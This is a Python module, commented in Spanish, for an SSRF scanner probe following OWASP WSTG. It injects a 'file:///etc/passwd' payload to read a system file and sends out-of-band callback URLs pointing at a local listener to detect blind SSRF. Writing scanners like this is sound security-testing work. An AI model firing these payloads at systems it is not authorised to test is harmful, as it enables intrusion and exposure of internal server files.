"""
Sonda SSRF (Server-Side Request Forgery) — OWASP WSTG-INPV-19.

Segunda sonda propia, escrita desde cero a partir de la metodología
pública OWASP WSTG (sin mirar wstg-scan). Dos técnicas complementarias:

1. Lectura de fichero interno vía file://: si al meter
   "file:///etc/passwd" en un punto de inyección aparece la cabecera
   típica de ese fichero ("root:x:0:0:") en la respuesta, el backend
   sigue el esquema sin restringirlo — el mismo patrón de
   confirmación que ya recoge la plantilla de referencia de
   PocketHacker ("confirmado mediante lectura real de un fichero
   interno del servidor"), no una lectura de su código.

2. Fuera de banda (OOB) con un listener propio: se monta un servidor
   HTTP efímero en la propia máquina de Paco (en un puerto libre) y
   se inyecta su URL, con un token único por punto de inyección, en
   cada parámetro. Si el backend hace de verdad la petición saliente
   —aunque no refleje nada en su respuesta (SSRF ciego)— el listener
   recibe la petición con el token, y eso ya es la confirmación. Es
   la única de las dos técnicas que no depende de que la respuesta
   refleje algo.

La IP propia que se usa en la URL de OOB se calcula con el truco
clásico del socket UDP "conectado": no llega a enviarse ningún
paquete, solo le pregunta al sistema operativo qué interfaz usaría
para llegar al target, así funciona sin tener que hardcodear qué IP
de Paco es la que ve el lab.
"""

import http.server
import random
import socket
import string
import threading
import time

import httpx

TIMEOUT = 10
OOB_WAIT_SECONDS = 3

FILE_READ_PAYLOAD = "file:///etc/passwd"
FILE_READ_MARKER = "root:x:0:0:"


class _OOBCollector:
    """Servidor HTTP efímero para detectar SSRF ciego: si el backend
    hace de verdad la petición que le mandamos, este listener recibe
    la petición con el token único de ese punto de inyección, aunque
    la respuesta de la app al cliente no refleje nada."""

    def __init__(self):
        self._hits: set[str] = set()
        self._lock = threading.Lock()
        collector = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                token = self.path.strip("/").rsplit("/", 1)[-1]
                with collector._lock:
                    collector._hits.add(token)
                self.send_response(200)
                self.end_headers()

            def log_message(self, format, *args):
                pass

        self._server = http.server.HTTPServer(("0.0.0.0", 0), Handler)
        self.port = self._server.server_port
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def received(self, token: str) -> bool:
        with self._lock:
            return token in self._hits

    def shutdown(self):
        self._server.shutdown()
        self._server.server_close()


def _my_reachable_ip(target_host: str) -> str:
    """IP local por la que se llegaría a target_host. No se envía
    ningún paquete de verdad (UDP no tiene handshake) — solo hace que
    el sistema operativo resuelva la interfaz/ruta de salida."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect((target_host, 80))
        return s.getsockname()[0]


def _send(client: httpx.Client, point: dict, value: str) -> httpx.Response:
    params = dict(point.get("params", {}))
    params[point["param"]] = value
    if point["method"] == "GET":
        return client.get(point["url"], params=params, timeout=TIMEOUT)
    return client.post(point["url"], data=params, timeout=TIMEOUT)


def _finding(point: dict, evidencia: str) -> dict:
    return {
        "name": "SSRF",
        "detail": (
            f"{point['method']} {point['url']} — el parámetro '{point['param']}' "
            f"huele a Server-Side Request Forgery: {evidencia}. Parece que el "
            f"backend hace peticiones salientes usando lo que le mandas, sin "
            f"restringir el destino — por ahí se podría llegar a recursos "
            f"internos que no deberían ser alcanzables desde fuera."
        ),
        "severity": "high",
    }


def run(injection_points: list[dict], target_host: str) -> list[dict]:
    """Devuelve una lista de hallazgos (uno por punto de inyección
    donde se detecta SSRF), con el mismo convenio que el resto de
    módulos: {"name", "detail", "severity"}. El timeout global lo
    controla dojohack.timeouts.run_module, no esta función."""
    findings: list[dict] = []
    if not injection_points:
        return findings

    collector = _OOBCollector()
    try:
        try:
            my_ip = _my_reachable_ip(target_host)
        except OSError:
            my_ip = None

        pending_oob: dict[str, dict] = {}
        confirmed_ids: set[int] = set()

        with httpx.Client(follow_redirects=True) as client:
            for idx, point in enumerate(injection_points):
                try:
                    resp = _send(client, point, FILE_READ_PAYLOAD)
                except httpx.HTTPError:
                    resp = None
                if resp is not None and FILE_READ_MARKER in resp.text:
                    findings.append(_finding(point, "lectura de fichero interno (file:///etc/passwd)"))
                    confirmed_ids.add(idx)
                    continue  # ya confirmado por esta vía, no hace falta la de OOB

                if my_ip is None:
                    continue
                token = f"{idx}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
                payload = f"http://{my_ip}:{collector.port}/{token}"
                try:
                    _send(client, point, payload)
                except httpx.HTTPError:
                    continue
                pending_oob[token] = point

            if pending_oob:
                time.sleep(OOB_WAIT_SECONDS)
                for token, point in pending_oob.items():
                    if collector.received(token):
                        findings.append(
                            _finding(point, "petición saliente real detectada fuera de banda (SSRF ciego)")
                        )
    finally:
        collector.shutdown()

    return findings
